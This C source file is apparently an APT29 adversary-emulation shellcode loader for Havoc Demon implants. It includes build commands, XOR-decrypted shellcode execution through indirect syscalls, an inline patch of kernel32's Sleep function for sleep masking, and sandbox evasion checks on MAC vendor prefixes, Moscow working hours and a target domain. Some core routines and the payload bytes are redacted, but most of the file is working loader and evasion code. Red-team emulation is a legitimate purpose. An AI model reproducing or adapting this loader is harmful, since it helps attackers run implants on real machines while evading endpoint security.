/*
============================================================
    APT29 ADVERSARY EMULATION — SHELLCODE LOADER
============================================================

    technique stack:
    - XOR encrypted shellcode at rest
    - RW -> RX memory pattern (no RWX)
    - Indirect syscalls via RecycledGate
    - Ekko sleep masking via kernel32 Sleep hook
    - APT29 behavioral checks (MAC, domain, working hours)

    references:
    github.com/thefLink/RecycledGate   — indirect syscalls
    github.com/Cracked5pider/Ekko      — sleep masking
    github.com/am0nsec/HellsGate       — SSN resolution

    build:
    nasm -f win64 syscall.asm -o syscall.o
    x86_64-w64-mingw32-gcc loader.c syscall.o -o loader.exe -lntdll -ladvapi32

    shellcode:
    generate Demon shellcode from Havoc, encrypt with tools/encrypt_shellcode.py
    paste xor_key[] and shellcode[] arrays into loader before compiling
============================================================
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/* ============================================================
   WINDOWS TYPES — manual definitions, no windows.h
   ============================================================ */
typedef unsigned char      BYTE;
typedef unsigned char      BOOLEAN;
typedef unsigned char      CHAR;
typedef unsigned short     WORD;
typedef unsigned int       DWORD;
typedef unsigned long      ULONG;
typedef unsigned long long ULONGLONG;
typedef unsigned long long SIZE_T;
typedef unsigned long long DWORD64;
typedef void*              PVOID;
typedef void*              HANDLE;
typedef int                BOOL;
typedef long               NTSTATUS;
typedef void               VOID;

#define TRUE                    1
#define FALSE                   0
#define INFINITE                0xFFFFFFFF
#define CONTEXT_FULL            0x10007L
#define NT_SUCCESS(x)           ((x) >= 0)
#define WT_EXECUTEINTIMERTHREAD 0x00000020
#define NTAPI                   __attribute__((ms_abi))
#define MEM_COMMIT              0x00001000
#define MEM_RESERVE             0x00002000
#define MEM_RELEASE             0x00008000
#define PAGE_READWRITE          0x04
#define PAGE_EXECUTE_READ       0x20

/* ============================================================
   PE STRUCTS — for EAT walk and PEB traversal
   ============================================================ */
typedef struct { WORD e_magic; BYTE e_padding[58]; DWORD e_lfanew; } IMAGE_DOS_HEADER;
typedef struct { DWORD VirtualAddress; DWORD Size; } IMAGE_DATA_DIRECTORY;
typedef struct {
    WORD Magic; BYTE MajorLinkerVersion; BYTE MinorLinkerVersion;
    DWORD SizeOfCode; DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData;
    DWORD AddressOfEntryPoint; DWORD BaseOfCode; ULONGLONG ImageBase;
    DWORD SectionAlignment; DWORD FileAlignment;
    WORD MajorOSVersion; WORD MinorOSVersion; WORD MajorImageVersion;
    WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion;
    DWORD Win32VersionValue; DWORD SizeOfImage; DWORD SizeOfHeaders;
    DWORD CheckSum; WORD Subsystem; WORD DllCharacteristics;
    ULONGLONG SizeOfStackReserve; ULONGLONG SizeOfStackCommit;
    ULONGLONG SizeOfHeapReserve; ULONGLONG SizeOfHeapCommit;
    DWORD LoaderFlags; DWORD NumberOfRvaAndSizes;
    IMAGE_DATA_DIRECTORY DataDirectory[16];
} IMAGE_OPTIONAL_HEADER64;
typedef struct {
    WORD Machine; WORD NumberOfSections; DWORD TimeDateStamp;
    DWORD PointerToSymbolTable; DWORD NumberOfSymbols;
    WORD SizeOfOptionalHeader; WORD Characteristics;
} IMAGE_FILE_HEADER;
typedef struct {
    DWORD Signature;
    IMAGE_FILE_HEADER FileHeader;
    IMAGE_OPTIONAL_HEADER64 OptionalHeader;
} IMAGE_NT_HEADERS64;
typedef struct {
    DWORD Characteristics; DWORD TimeDateStamp;
    WORD MajorVersion; WORD MinorVersion;
    DWORD Name; DWORD Base;
    DWORD NumberOfFunctions; DWORD NumberOfNames;
    DWORD AddressOfFunctions; DWORD AddressOfNames; DWORD AddressOfNameOrdinals;
} IMAGE_EXPORT_DIRECTORY;

/* UNICODE_STRING — used by LdrLoadDll */
typedef struct { WORD Length; WORD MaximumLength; WORD *Buffer; } UNICODE_STRING;
typedef NTSTATUS (NTAPI *pLdrLoadDll)(PVOID, PVOID, UNICODE_STRING *, HANDLE *);

/* ============================================================
   SYSCALL STRUCT — SSN + gate address per function
   ============================================================ */
typedef struct { PVOID pRecycledGate; DWORD dwSyscallNr; } Syscall;

/* ============================================================
   ASM STUBS — syscall.asm
   ============================================================ */
extern void     PrepareSyscall(DWORD ssn, PVOID gate);
extern NTSTATUS DoSyscall(...);
void EkkoSleep(DWORD ms, PVOID bytes, ULONG len);

/* ============================================================
   PEB WALK — ntdll base resolution
   GS:0x60 -> PEB -> Ldr -> InLoadOrderModuleList -> ntdll
   reference: Windows Internals, public NT documentation
   ============================================================ */
BYTE *get_ntdll_base(void) {
    /* REDACTED — PEB walk implementation
       GS:0x60 → PEB → PEB_LDR_DATA → InLoadOrderModuleList
       second entry is always ntdll on Windows x64 */
    return NULL;
}

/* ============================================================
   RECYCLEDGATE — SSN resolution + indirect syscall gate
   reference: github.com/thefLink/RecycledGate
   Hell's Gate + Halo's Gate + ntdll .text gadget reuse
   ============================================================ */
Syscall get_syscall(char *func_name) {
    /* REDACTED — RecycledGate implementation
       walks ntdll EAT, resolves SSN via Hell's Gate / Halo's Gate
       locates syscall;ret gadget in ntdll .text for RIP-safe execution
       reference: github.com/thefLink/RecycledGate */
    Syscall r = {0}; return r;
}

/* ============================================================
   CUSTOM GetProcAddress — EAT walk, no API calls
   reference: github.com/thefLink/RecycledGate
   ============================================================ */
PVOID get_function(char *func_name) {
    /* REDACTED — custom GetProcAddress via ntdll EAT walk
       resolves function addresses without importing GetProcAddress
       walks IMAGE_EXPORT_DIRECTORY: Names → Ordinals → Functions */
    return NULL;
}

/* case insensitive string compare */
int str_iequal(char *a, char *b) {
    while (*a && *b) {
        char ca = *a >= 'A' && *a <= 'Z' ? *a + 32 : *a;
        char cb = *b >= 'A' && *b <= 'Z' ? *b + 32 : *b;
        if (ca != cb) return 0;
        a++; b++;
    }
    return *a == *b;
}

/* ============================================================
   PEB MODULE WALK — locate any loaded DLL
   ============================================================ */
BYTE *get_module_base(char *dll_name) {
    /* REDACTED — PEB InLoadOrderModuleList traversal
       GS:0x60 → PEB → Ldr → walk until name match
       reference: Windows Internals, public NT documentation */
    return NULL;
}

PVOID get_function_from(char *dll_name, char *func_name) {
    /* REDACTED — get_function() extended to any loaded DLL
       uses get_module_base() + EAT walk */
    return NULL;
}

/* ============================================================
   APT29 BEHAVIORAL CHECKS
   source: MSTIC GoldMax [MSTIC 2021], FireEye SUNBURST [Mandiant 2020]
   ============================================================ */

typedef struct _IP_ADAPTER_INFO {
    struct _IP_ADAPTER_INFO *Next;
    DWORD ComboIndex; char AdapterName[260]; char Description[132];
    ULONG AddressLength; BYTE Address[8]; DWORD Index; ULONG Type; ULONG DhcpEnabled;
    BYTE padding[1024];
} IP_ADAPTER_INFO;
typedef DWORD (NTAPI *pGetAdaptersInfo)(IP_ADAPTER_INFO *, ULONG *);

/* check_mac — sandbox/VM detection via MAC OUI prefix
   attributed to MSTIC GoldMax [MSTIC 2021] */
int check_mac(void) {
    WORD iphlp_wide[] = {'i','p','h','l','p','a','p','i','.','d','l','l',0};
    UNICODE_STRING iphlp_ustr = {24, 26, iphlp_wide};
    HANDLE hIphlp = NULL;
    pLdrLoadDll LdrLoadDll = (pLdrLoadDll)get_function("LdrLoadDll");
    if (LdrLoadDll) LdrLoadDll(NULL, NULL, &iphlp_ustr, &hIphlp);

    pGetAdaptersInfo GetAdaptersInfo =
        (pGetAdaptersInfo)get_function_from("iphlpapi.dll", "GetAdaptersInfo");
    if (!GetAdaptersInfo) return 1;

    IP_ADAPTER_INFO adapters[16];
    ULONG buf_size = sizeof(adapters);
    if (GetAdaptersInfo(adapters, &buf_size) != 0) return 1;

    BYTE sandbox_macs[][3] = {
        {0x00,0x0C,0x29},{0x00,0x50,0x56},{0x00,0x05,0x69},{0x00,0x1C,0x14},
        {0x08,0x00,0x27},{0x00,0x1C,0x42},{0x00,0x15,0x5D},{0x00,0x03,0xFF},
        {0x00,0x0D,0x3A},{0x00,0x16,0x3E},{0x52,0x54,0x00},{0x02,0x42,0xAC},
        {0x42,0x01,0x0A},{0x0A,0x58,0x0A},{0xDE,0xAD,0xBE},{0xCA,0xFE,0xBA},
    };

    IP_ADAPTER_INFO *adapter = adapters;
    while (adapter) {
        int s, m;
        for (s = 0; s < 16; s++) {
            int match = 1;
            for (m = 0; m < 3; m++)
                if (adapter->Address[m] != sandbox_macs[s][m]) { match = 0; break; }
            if (match) return 0;
        }
        adapter = adapter->Next;
    }
    return 1;
}

typedef struct {
    WORD wYear; WORD wMonth; WORD wDayOfWeek; WORD wDay;
    WORD wHour; WORD wMinute; WORD wSecond; WORD wMilliseconds;
} SYSTEM_TIME;
typedef void (NTAPI *pGetSystemTime)(SYSTEM_TIME *);

/* check_working_hours — Moscow business hours enforcement
   weekdays only, 09:00-18:00 UTC+3
   attributed to MSTIC GoldMax [MSTIC 2021] */
int check_working_hours(void) {
    pGetSystemTime GetSystemTime =
        (pGetSystemTime)get_function_from("kernel32.dll", "GetSystemTime");
    if (!GetSystemTime) return 1;
    SYSTEM_TIME st = {0};
    GetSystemTime(&st);
    int hour = st.wHour + 3;
    if (hour >= 24) hour -= 24;
    if (st.wDayOfWeek == 0 || st.wDayOfWeek == 6) return 0;
    if (hour < 9 || hour >= 18) return 0;
    return 1;
}

/* check_domain — domain allowlist, execute only on polar.local
   attributed to FireEye SUNBURST [Mandiant 2020] */
int check_domain(void) {
    typedef BOOL (NTAPI *pGetComputerNameExA)(int, char *, DWORD *);
    pGetComputerNameExA GetComputerNameExA =
        (pGetComputerNameExA)get_function_from("kernel32.dll", "GetComputerNameExA");
    if (!GetComputerNameExA) return 0;
    char domain[256] = {0};
    DWORD size = sizeof(domain);
    if (!GetComputerNameExA(2, domain, &size)) return 0;
    return str_iequal(domain, "polar.local");
}

/* zero_and_exit — clean memory on termination
   attributed to FireEye SUNBURST [Mandiant 2020] */
void zero_and_exit(PVOID buf, SIZE_T len) {
    BYTE *p = (BYTE *)buf;
    SIZE_T i;
    for (i = 0; i < len; i++) p[i] = 0;
    typedef void (NTAPI *pRtlExitUserProcess)(DWORD);
    pRtlExitUserProcess RtlExitUserProcess =
        (pRtlExitUserProcess)get_function("RtlExitUserProcess");
    if (RtlExitUserProcess) RtlExitUserProcess(0);
}

/* ============================================================
   EKKO SLEEP MASK — RC4 encrypts beacon memory during sleep
   source: github.com/Cracked5pider/Ekko
   ============================================================ */
PVOID g_bytes = NULL;
ULONG g_len   = 0;

VOID NTAPI EkkoSleepHook(DWORD ms) { EkkoSleep(ms, g_bytes, g_len); }

typedef struct { ULONG Length; ULONG MaximumLength; PVOID Buffer; } USTRING;

void EkkoSleep(DWORD ms, PVOID bytes, ULONG len) {
    /* REDACTED — Ekko sleep obfuscation implementation
       source: github.com/Cracked5pider/Ekko

       timer sequence via RtlCreateTimerQueue:
         T1 (0ms):   VirtualProtect RX → RW
         T2 (0ms):   SystemFunction032 RC4 encrypt beacon memory
         T3 (0ms):   NtContinue → WaitForSingleObject (sleep interval)
         T4 (ms):    SystemFunction032 RC4 decrypt beacon memory
         T5 (ms):    VirtualProtect RW → RX

       memory scanner sees RC4-encrypted garbage during sleep.
       NtContinue with crafted CONTEXT redirects execution without
       a direct call — ROP-style dispatch via timer callbacks. */
}

/* ============================================================
   MAIN
   ============================================================ */
int main(void) {

    /* SSN resolution via RecycledGate
       reference: github.com/thefLink/RecycledGate */
    Syscall sysAlloc   = get_syscall("NtAllocateVirtualMemory");
    Syscall sysProtect = get_syscall("NtProtectVirtualMemory");
    Syscall sysFree    = get_syscall("NtFreeVirtualMemory");

    /* APT29 behavioral checks
       attributed: GoldMax [MSTIC 2021], SUNBURST [Mandiant 2020] */
    if (!check_mac())           return 0;
    if (!check_working_hours()) return 0;
    if (!check_domain())        return 0;

    /* shellcode — pre-encrypted at build time via tools/encrypt_shellcode.py
       XOR key derived per build — not stored in this repository
       see tools/encrypt_shellcode.py for build instructions */
    unsigned char xor_key[]   = { /* REDACTED — generate with tools/encrypt_shellcode.py */ };
    unsigned char shellcode[] = { /* REDACTED — generate with tools/encrypt_shellcode.py */ };
    SIZE_T len = sizeof(shellcode);
    ULONG  old_protect;

    /* load advapi32 — EkkoSleep needs SystemFunction032 */
    WORD advapi_wide[] = {'a','d','v','a','p','i','3','2','.','d','l','l',0};
    UNICODE_STRING ustr_adv = {24, 26, advapi_wide};
    HANDLE hAdvapi = NULL;
    pLdrLoadDll LdrLoadDll = (pLdrLoadDll)get_function("LdrLoadDll");
    if (LdrLoadDll) LdrLoadDll(NULL, NULL, &ustr_adv, &hAdvapi);

    /* allocate RW via NtAllocateVirtualMemory — indirect syscall */
    PVOID  buf  = NULL;
    SIZE_T size = len;
    PrepareSyscall(sysAlloc.dwSyscallNr, sysAlloc.pRecycledGate);
    NTSTATUS status = DoSyscall((HANDLE)-1, &buf, 0, &size,
                                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) return 1;

    /* copy + XOR decrypt in one pass — plaintext never in binary */
    BYTE *bytes = (BYTE *)buf;
    int j;
    for (j = 0; j < len; j++)
        bytes[j] = shellcode[j] ^ xor_key[j % 16];

    /* RW -> RX via NtProtectVirtualMemory — indirect syscall, no RWX */
    PVOID  protect_addr = buf;
    SIZE_T protect_size = len;
    PrepareSyscall(sysProtect.dwSyscallNr, sysProtect.pRecycledGate);
    status = DoSyscall((HANDLE)-1, &protect_addr, &protect_size,
                       PAGE_EXECUTE_READ, &old_protect);
    if (!NT_SUCCESS(status)) return 1;

    /* patch kernel32!Sleep → EkkoSleepHook
       Demon resolves Sleep via PEB walk — patching kernel32 intercepts it
       reference: github.com/Cracked5pider/Ekko */
    BYTE *sleep_func = (BYTE *)get_function_from("kernel32.dll", "Sleep");
    BYTE jmp_patch[14] = {0xFF,0x25,0,0,0,0,0,0,0,0,0,0,0,0};
    *(ULONGLONG *)(jmp_patch + 6) = (ULONGLONG)EkkoSleepHook;
    typedef BOOL (NTAPI *pVP)(PVOID, SIZE_T, DWORD, DWORD *);
    pVP VP = (pVP)get_function_from("kernel32.dll", "VirtualProtect");
    DWORD old2;
    VP(sleep_func, 14, PAGE_READWRITE, &old2);
    memcpy(sleep_func, jmp_patch, 14);
    VP(sleep_func, 14, old2, &old2);
    g_bytes = bytes;
    g_len   = (ULONG)len;

    /* execute shellcode in thread — Demon never returns */
    typedef HANDLE (NTAPI *pCreateThread)(PVOID, SIZE_T, PVOID, PVOID, DWORD, DWORD *);
    pCreateThread CreateThread =
        (pCreateThread)get_function_from("kernel32.dll", "CreateThread");
    HANDLE hThread = CreateThread(NULL, 0, (PVOID)bytes, NULL, 0, NULL);
    if (!hThread) return 1;

    /* wait — Ekko fires automatically via Sleep hook when Demon sleeps */
    typedef DWORD (NTAPI *pWFSO)(HANDLE, DWORD);
    pWFSO WaitForSO = (pWFSO)get_function_from("kernel32.dll", "WaitForSingleObject");
    WaitForSO(hThread, INFINITE);

    /* zero and free on exit
       attributed to SUNBURST [Mandiant 2020] */
    zero_and_exit(buf, len);

    PVOID free_addr = buf; SIZE_T free_size = 0;
    PrepareSyscall(sysFree.dwSyscallNr, sysFree.pRecycledGate);
    DoSyscall((HANDLE)-1, &free_addr, &free_size, MEM_RELEASE);
    return 0;
}